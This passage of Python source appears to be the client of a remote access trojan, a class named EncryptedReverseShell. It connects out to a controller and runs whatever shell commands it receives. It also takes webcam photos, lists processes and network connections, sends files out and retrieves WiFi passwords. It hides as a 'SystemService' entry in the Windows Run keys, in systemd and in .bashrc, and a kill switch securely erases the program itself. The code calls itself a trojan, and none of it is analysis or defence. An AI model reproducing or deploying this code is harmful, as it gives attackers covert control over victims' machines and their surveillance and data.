    def list_cameras(self):
        try:
            cameras = []
            for i in range(10):
                cap = cv2.VideoCapture(i)

                if cap.isOpened():
                    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
                    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
                    fps = cap.get(cv2.CAP_PROP_FPS)
                    
                    cameras.append({
                        "index": i,
                        "resolution": f"{width}x{height}",
                        "fps": round(fps, 1) if fps > 0 else "unknown",
                        "status": "available"
                    })
                    cap.release()
            
            if not cameras:
                return {"error": "No cameras found"}
            
            return {"cameras": cameras}
        except Exception as e:
            return {"error": f"Camera list failed: {str(e)}"}

    def take_camera_photo(self, camera_index=0):
        try:
            camera = cv2.VideoCapture(camera_index)
            if not camera.isOpened():
                return {"error": f"Camera {camera_index} not available"}
            
            time.sleep(1)
            ret, frame = camera.read()

            width = int(camera.get(cv2.CAP_PROP_FRAME_WIDTH))
            height = int(camera.get(cv2.CAP_PROP_FRAME_HEIGHT))
            
            camera.release()
            
            if not ret:
                return {"error": "Failed to capture image"}
            
            ret, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
            if not ret:
                return {"error": "Failed to encode image"}
            
            photo_data = base64.b64encode(buffer).decode('utf-8')
            return {
                "camera_photo": photo_data,
                "size": len(photo_data),
                "camera_index": camera_index,
                "resolution": f"{width}x{height}"
            }
        except Exception as e:
            return {"error": f"Camera capture failed: {str(e)}"}

    def list_processes(self):
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info', 'cpu_percent']):
                try:
                    processes.append({
                        "pid": proc.info['pid'],
                        "name": proc.info['name'],
                        "user": proc.info['username'],
                        "memory_mb": round(proc.info['memory_info'].rss / (1024**2), 1),
                        "cpu": round(proc.info['cpu_percent'], 1)
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return {"processes": processes}
        except Exception as e:
            return {"error": f"Process list failed: {str(e)}"}

    def get_network_info(self):
        try:
            network_info = {
                "connections": [],
                "interfaces": {}
            }

            for interface, addrs in psutil.net_if_addrs().items():
                network_info["interfaces"][interface] = []
                for addr in addrs:
                    network_info["interfaces"][interface].append({
                        "family": str(addr.family),
                        "address": addr.address,
                        "netmask": addr.netmask
                    })

            for conn in psutil.net_connections(kind='inet'):
                if conn.laddr and conn.status == 'ESTABLISHED':
                    network_info["connections"].append({
                        "local_address": f"{conn.laddr.ip}:{conn.laddr.port}",
                        "status": conn.status,
                        "pid": conn.pid
                    })
            
            return network_info
        except Exception as e:
            return {"error": f"Network info failed: {str(e)}"}

    def download_file(self, file_path):
        try:
            if not os.path.exists(file_path):
                return {"error": "File not found"}
            
            if not os.path.isfile(file_path):
                return {"error": "Path is not a file"}
            
            file_size = os.path.getsize(file_path)
            if file_size > 50 * 1024 * 1024:
                return {"error": "File too large (max 50MB)"}
            
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            return {
                "file_data": base64.b64encode(file_data).decode('utf-8'),
                "file_name": os.path.basename(file_path),
                "file_size": len(file_data)
            }
        except Exception as e:
            return {"error": f"File read failed: {str(e)}"}

    def upload_file(self, file_data, file_name, target_path=None):
        try:
            file_bytes = base64.b64decode(file_data)
            
            if target_path:
                save_path = target_path
            else:
                save_path = os.path.join(os.getcwd(), file_name)
            
            save_dir = os.path.dirname(save_path)
            if save_dir and not os.path.exists(save_dir):
                os.makedirs(save_dir, exist_ok=True)
            
            with open(save_path, 'wb') as f:
                f.write(file_bytes)
            
            if os.path.exists(save_path):
                file_size = os.path.getsize(save_path)
                return {
                    "success": True,
                    "message": f"File uploaded successfully to {save_path}",
                    "file_size": file_size,
                    "saved_path": save_path
                }
            else:
                return {"error": "File upload failed - file not created"}
                
        except Exception as e:
            return {"error": f"File upload failed: {str(e)}"}
        
    def gutmann_patterns(self):
        patterns = []
    
        for _ in range(4):
            patterns.append([os.urandom(1) for _ in range(256)])
    
        patterns.append([b'\x55'] * 256)
        patterns.append([b'\xAA'] * 256)
        patterns.append([b'\x92\x49\x24'] * 85 + [b'\x92'])
        patterns.append([b'\x49\x24\x92'] * 85 + [b'\x49'])
        patterns.append([b'\x24\x92\x49'] * 85 + [b'\x24'])
    
        for _ in range(4):
            patterns.append([os.urandom(1) for _ in range(256)])
    
        return patterns
    
    def kill(self, file_path):
        if not os.path.exists(file_path):
            return False
    
        file_size = os.path.getsize(file_path)
        patterns = self.gutmann_patterns()
    
        for i, pattern in enumerate(patterns):
            data = b''.join(pattern * (file_size // 256 + 1))[:file_size]
            
            with open(file_path, 'wb') as f:
                f.write(data)
    
        os.remove(file_path)
        return True

    def execute_kill_switch(self):
        try:
            print("[+] Kill switch activated - self-destructing...")
            
            self.remove_from_startup()
            
            if getattr(sys, 'frozen', False):
                current_file = sys.executable
            else:
                current_file = os.path.abspath(__file__)
            
            if self.sock:
                try:
                    self.sock.close()
                except:
                    pass
            
            if os.path.exists(current_file):
                try:
                    self.kill(current_file)
                    
                    time.sleep(2)
                    os._exit(0)
                except Exception as e:
                    print(f"[-] File deletion failed: {e}")
            
        except Exception as e:
            print(f"[-] Kill switch failed: {e}")
            try:
                sys.exit(1)
            except:
                os._exit(1)

    def add_to_startup(self, name="SystemService"):
        try:
            if getattr(sys, 'frozen', False):
                executable_path = sys.executable
            else:
                executable_path = f'"{sys.executable}" "{os.path.abspath(__file__)}"'

            system = platform.system()

            if system == "Windows":
                if not self.is_admin():
                    return {"error": "Administrator privileges required for startup registration"}
                
                user_startup = False
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                        r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                        0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, executable_path)
                    winreg.CloseKey(key)
                    user_startup = True
                except Exception as e:
                    return {"error": f"User startup registration failed: {str(e)}"}

                system_startup = False
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
                                        0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, executable_path)
                    winreg.CloseKey(key)
                    system_startup = True
                except:
                    pass
                
                return {
                    "success": True,
                    "message": f"Added to startup as '{name}'",
                    "user_startup": user_startup,
                    "system_startup": system_startup,
                    "platform": "Windows"
                }

            elif system == "Linux":
                home_dir = os.path.expanduser("~")
                service_dir = os.path.join(home_dir, ".config", "systemd", "user")
                service_file = os.path.join(service_dir, f"{name}.service")
                
                try:
                    if not os.path.exists(service_dir):
                        os.makedirs(service_dir)
                except Exception as e:
                    return {"error": f"Cannot create service directory: {str(e)}"}

                if getattr(sys, 'frozen', False):
                    exec_cmd = executable_path
                else:
                    exec_cmd = f"{sys.executable} {os.path.abspath(__file__)}"

                service_content = f"""[Unit]
Description={name} Service
After=network.target

[Service]
ExecStart={exec_cmd}
Restart=always
RestartSec=10
WorkingDirectory={os.path.dirname(os.path.abspath(__file__)) if not getattr(sys, 'frozen', False) else '/'}

[Install]
WantedBy=default.target
"""
                systemd_enabled = False
                try:
                    with open(service_file, 'w') as f:
                        f.write(service_content)
                    
                    subprocess.run(['systemctl', '--user', 'daemon-reload'], capture_output=True)
                    subprocess.run(['systemctl', '--user', 'enable', f'{name}.service'], capture_output=True)
                    subprocess.run(['systemctl', '--user', 'start', f'{name}.service'], capture_output=True)
                    
                    check_result = subprocess.run(['systemctl', '--user', 'is-active', f'{name}.service'], 
                                                capture_output=True, text=True)
                    systemd_enabled = (check_result.stdout.strip() == 'active')
                except:
                    systemd_enabled = False

                bashrc_enabled = False
                try:
                    bashrc_path = os.path.join(home_dir, ".bashrc")
                    startup_line = f'\n# {name}\n(cd /tmp; nohup {exec_cmd} > /dev/null 2>&1 &)\n'
                    
                    if os.path.exists(bashrc_path):
                        with open(bashrc_path, 'r') as f:
                            content = f.read()
                        if f"# {name}" not in content:
                            with open(bashrc_path, 'a') as f:
                                f.write(startup_line)
                        bashrc_enabled = True
                    else:
                        with open(bashrc_path, 'w') as f:
                            f.write(startup_line)
                        bashrc_enabled = True
                except:
                    bashrc_enabled = False

                message = f"Added to startup as '{name}'"
                if systemd_enabled:
                    message += " (systemd active)"
                elif os.path.exists(service_file):
                    message += " (systemd installed but inactive)"
                if bashrc_enabled:
                    message += " (.bashrc)"
                
                return {
                    "success": systemd_enabled or bashrc_enabled,
                    "message": message,
                    "systemd_enabled": systemd_enabled,
                    "bashrc_enabled": bashrc_enabled,
                    "platform": "Linux"
                }
            else:
                return {"error": f"Unsupported platform: {system}"}

        except Exception as e:
            return {"error": f"Startup registration failed: {str(e)}"}
    
    def remove_from_startup(self, name="SystemService"):
        try:
            system = platform.system()
            
            if system == "Windows":
                removed = []
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                        r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                        0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(key, name)
                    winreg.CloseKey(key)
                    removed.append("HKEY_CURRENT_USER")
                except:
                    pass

                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
                                        0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(key, name)
                    winreg.CloseKey(key)
                    removed.append("HKEY_LOCAL_MACHINE")
                except:
                    pass
                
                if removed:
                    return {"success": True, "message": f"Removed from startup: {', '.join(removed)}"}
                else:
                    return {"message": "Not found in startup"}

            elif system == "Linux":
                home_dir = os.path.expanduser("~")
                service_file = os.path.join(home_dir, ".config", "systemd", "user", f"{name}.service")
                results = []
                
                try:
                    subprocess.run(['systemctl', '--user', 'stop', f'{name}.service'], capture_output=True)
                    subprocess.run(['systemctl', '--user', 'disable', f'{name}.service'], capture_output=True)
                    
                    if os.path.exists(service_file):
                        os.remove(service_file)
                        subprocess.run(['systemctl', '--user', 'daemon-reload'], capture_output=True)
                        results.append("systemd service removed")
                    else:
                        results.append("systemd service not found")
                except:
                    results.append("systemd removal attempted")
                
                try:
                    bashrc_path = os.path.join(home_dir, ".bashrc")
                    if os.path.exists(bashrc_path):
                        with open(bashrc_path, 'r') as f:
                            lines = f.readlines()
                        marker = f"# {name}"
                        new_lines = []
                        skip = False
                        for line in lines:
                            if marker in line:
                                skip = True
                            elif skip:
                                if line.strip().startswith('(') or line.strip().startswith('nohup'):
                                    skip = False
                                    continue
                                skip = False
                            if not skip:
                                new_lines.append(line)
                        
                        if len(new_lines) < len(lines):
                            with open(bashrc_path, 'w') as f:
                                f.writelines(new_lines)
                            results.append(".bashrc cleaned")
                        else:
                            results.append(".bashrc entry not found")
                    else:
                        results.append(".bashrc not found")
                except:
                    results.append(".bashrc removal attempted")
                
                return {"success": True, "message": f"Removed from startup: {'; '.join(results)}"}
            else:
                return {"error": f"Unsupported platform: {system}"}
                
        except Exception as e:
            return {"error": f"Startup removal failed: {str(e)}"}
    
    def check_startup_status(self, name="SystemService"):
        try:
            system = platform.system()
            status = {}

            if system == "Windows":
                status["HKEY_CURRENT_USER"] = False
                status["HKEY_LOCAL_MACHINE"] = False
                
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                        r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                        0, winreg.KEY_READ)
                    try:
                        value, _ = winreg.QueryValueEx(key, name)
                        status["HKEY_CURRENT_USER"] = True
                    except:
                        pass
                    winreg.CloseKey(key)
                except:
                    pass
                
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
                                        0, winreg.KEY_READ)
                    try:
                        value, _ = winreg.QueryValueEx(key, name)
                        status["HKEY_LOCAL_MACHINE"] = True
                    except:
                        pass
                    winreg.CloseKey(key)
                except:
                    pass

            elif system == "Linux":
                home_dir = os.path.expanduser("~")
                status["systemd_service"] = False
                status["bashrc_entry"] = False
                
                service_file = os.path.join(home_dir, ".config", "systemd", "user", f"{name}.service")
                if os.path.exists(service_file):
                    result = subprocess.run(['systemctl', '--user', 'is-active', f'{name}.service'], 
                                          capture_output=True, text=True)
                    status["systemd_service"] = (result.stdout.strip() == 'active')
                else:
                    status["systemd_service"] = False
                
                bashrc_path = os.path.join(home_dir, ".bashrc")
                if os.path.exists(bashrc_path):
                    with open(bashrc_path, 'r') as f:
                        content = f.read()
                    status["bashrc_entry"] = f"# {name}" in content
                else:
                    status["bashrc_entry"] = False
            
            return {"startup_status": status, "platform": system}
            
        except Exception as e:
            return {"error": f"Startup check failed: {str(e)}"}

    def execute_command(self, command_data):
        try:
            if isinstance(command_data, str):
                command = command_data
                cmd_type = "shell"
            else:
                cmd_type = command_data.get("type", "shell")
                command = command_data.get("command", "")
                upload_data = command_data.get("upload_data")
                target_path = command_data.get("target_path")
                file_name = command_data.get("file_name")
                camera_index = command_data.get("camera_index", 0)
                startup_name = command_data.get("startup_name", "SystemService")
            
            if cmd_type == "shell":
                if command.startswith('cd '):
                    path = command[3:].strip()
                    try:
                        os.chdir(path)
                        return {"output": f"Changed directory to {os.getcwd()}"}
                    except Exception as e:
                        return {"error": f"cd failed: {str(e)}"}
                
                try:
                    system_encoding = self.get_system_encoding()
                    
                    result = subprocess.run(
                        command, 
                        shell=True, 
                        capture_output=True, 
                        timeout=30
                    )

                    stdout = result.stdout.decode(system_encoding, errors='replace')
                    stderr = result.stderr.decode(system_encoding, errors='replace')
                    
                    output = stdout
                    if stderr:
                        output += f"\nERROR: {stderr}"
                        
                    return {"output": output if output else "", "encoding": system_encoding}
                    
                except subprocess.TimeoutExpired:
                    return {"error": "Command timed out"}
                except Exception as e:
                    return {"error": f"Command execution failed: {str(e)}"}
            
            elif cmd_type == "info":
                return {"system_info": self.get_system_info()}
            
            elif cmd_type == "screenshot":
                return {"screenshot_result": self.take_screenshot()}
            
            elif cmd_type == "list_cam":
                return {"camera_list": self.list_cameras()}
            
            elif cmd_type == "cam":
                return {"camera_result": self.take_camera_photo(camera_index)}
            
            elif cmd_type == "processes":
                return {"process_list": self.list_processes()}
            
            elif cmd_type == "network":
                return {"network_info": self.get_network_info()}
            
            elif cmd_type == "download":
                return {"download_result": self.download_file(command)}
            
            elif cmd_type == "battery":
                return {"battery_result": self.get_battery_info()}
            
            elif cmd_type == "reboot":
                return {"reboot_result": self.reboot_system()}
            
            elif cmd_type == "shutdown":
                return {"shutdown_result": self.shutdown_system()}
            
            elif cmd_type == "wifi_passwords":
                return {"wifi_result": self.get_wifi_passwords()}
            
            elif cmd_type == "pwd":
                return {"pwd_result": self.get_current_directory()}
            
            elif cmd_type == "ls":
                path = command if command else None
                result = self.ls_directory(path)
                return {"ls_result": result}
            
            elif cmd_type == "cat":
                if command:
                    result = self.cat_file(command)
                    return {"cat_result": result}
                else:
                    return {"error": "Please specify a file path"}
            
            elif cmd_type == "suspend":
                if command:
                    return {"suspend_result": self.suspend_process(command)}
                else:
                    return {"error": "Please specify process name or PID"}
                
            elif cmd_type == "list_printers":
                return {"printer_list": self.list_printers()}

            elif cmd_type == "print_file":
                file_path = command_data.get('file_path')
                printer_name = command_data.get('printer_name', '')
                if file_path:
                    return {"print_result": self.print_file(file_path, printer_name)}
                else:
                    return {"error": "Missing file_path"}

            elif cmd_type == "local_time":
                return {"local_time_result": self.get_local_time()}
            
            elif cmd_type == "kill_process":
                if command:
                    return {"kill_result": self.kill_process(command)}
                else:
                    return {"error": "Please specify process name or PID"}
            
            elif cmd_type == "kill_switch":
                def delayed_destruction():
                    time.sleep(1)
                    self.execute_kill_switch()
                
                destruction_thread = threading.Thread(target=delayed_destruction, daemon=True)
                destruction_thread.start()
                
                return {"killed": "OK! Trojan destroyed and connection terminated."}
            
            elif cmd_type == "open_page":
                if command:
                    return {"open_page_result": self.open_page(command)}
                else:
                    return {"error": "Please specify a URL to open"}
                
            elif cmd_type == "messagebox":
                msg_title = command_data.get("title", "Message")
                msg_text = command_data.get("message", command)
                msg_type = command_data.get("msg_type", "info")
                return {"messagebox_result": self.show_messagebox(msg_title, msg_text, msg_type)}
            
            elif cmd_type == "upload":
                if upload_data and file_name:
                    return {"upload_result": self.upload_file(upload_data, file_name, target_path)}
                else:
                    return {"error": "Missing upload data or filename"}
            
            elif cmd_type == "add_to_startup":
                return {"startup_result": self.add_to_startup(startup_name)}
            
            elif cmd_type == "remove_from_startup":
                return {"startup_result": self.remove_from_startup(startup_name)}
            
            elif cmd_type == "check_startup":
                return {"startup_status": self.check_startup_status(startup_name)}
            
            elif cmd_type == "heartbeat":
                return {"type": "heartbeat", "status": "alive"}
            
            else:
                return {"error": f"Unknown command type: {cmd_type}"}
            
        except Exception as e:
            return {"error": f"Execution failed: {str(e)}"}
    
    def start_shell(self):
        print("[+] Shell started, waiting for commands...")
        self.connected = True
        last_heartbeat_sent = time.time()
        
        while self.connected:
            try:
                command_data = self.recv_encrypted(timeout=30)
                
                if command_data is None:
                    print("[-] Connection lost")
                    break
                
                if isinstance(command_data, dict) and command_data.get("type") == "heartbeat":
                    if time.time() - last_heartbeat_sent > self.heartbeat_interval:
                        self.send_encrypted({"type": "heartbeat", "status": "alive"})
                        last_heartbeat_sent = time.time()
                    continue
                
                if time.time() - self.last_heartbeat > 300:
                    print("[-] Connection timeout")
                    break
                
                if isinstance(command_data, str) and command_data in ["exit", "quit"]:
                    self.send_encrypted({"type": "status", "message": "Session terminated"})
                    break
                
                result = self.execute_command(command_data)
                if not self.send_encrypted(result):
                    print("[-] Failed to send response")
                    break
                
                last_heartbeat_sent = time.time() if isinstance(result, dict) and result.get("type") == "heartbeat" else last_heartbeat_sent
                    
            except socket.timeout:
                if time.time() - last_heartbeat_sent > self.heartbeat_interval:
                    if not self.send_heartbeat():
                        print("[-] Heartbeat failed, connection lost")
                        break
                    last_heartbeat_sent = time.time()
                continue
            except Exception as e:
                print(f"[-] Error in shell: {e}")
                try:
                    self.send_encrypted({"error": f"Shell error: {str(e)}"})
                except:
                    break
                continue
        
        self.connected = False
    
    def connect(self):
        max_retries = 5
        retry_delay = 10
        
        while True:
            for attempt in range(max_retries):
                try:
                    print(f"[+] Attempting connection to {HOST}:{self.get_port()} (attempt {attempt + 1}/{max_retries})")
                    
                    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.sock.settimeout(30)
                    self.sock.connect((HOST, self.get_port()))
                    
                    print("[+] Connected, performing key exchange...")
                    
                    self.key_exchange()
                    
                    print("[+] Key exchange completed, starting shell...")

                    self.start_shell()
                    
                    print("[-] Shell session ended, reconnecting...")
                    break
                    
                except Exception as e:
                    print(f"[-] Connection failed: {e}")
                    if self.sock:
                        self.sock.close()
                        self.sock = None
                    
                    if attempt < max_retries - 1:
                        print(f"[+] Retrying in {retry_delay} seconds...")
                        time.sleep(retry_delay)
                    else:
                        print(f"[-] Max retries exceeded, waiting {retry_delay * 2} seconds before new cycle...")
                        time.sleep(retry_delay * 2)
                        break
            
            print(f"[+] Starting new connection cycle in {retry_delay * 3} seconds...")
            time.sleep(retry_delay * 3)

if __name__ == "__main__":
    shell = EncryptedReverseShell()
    shell.connect()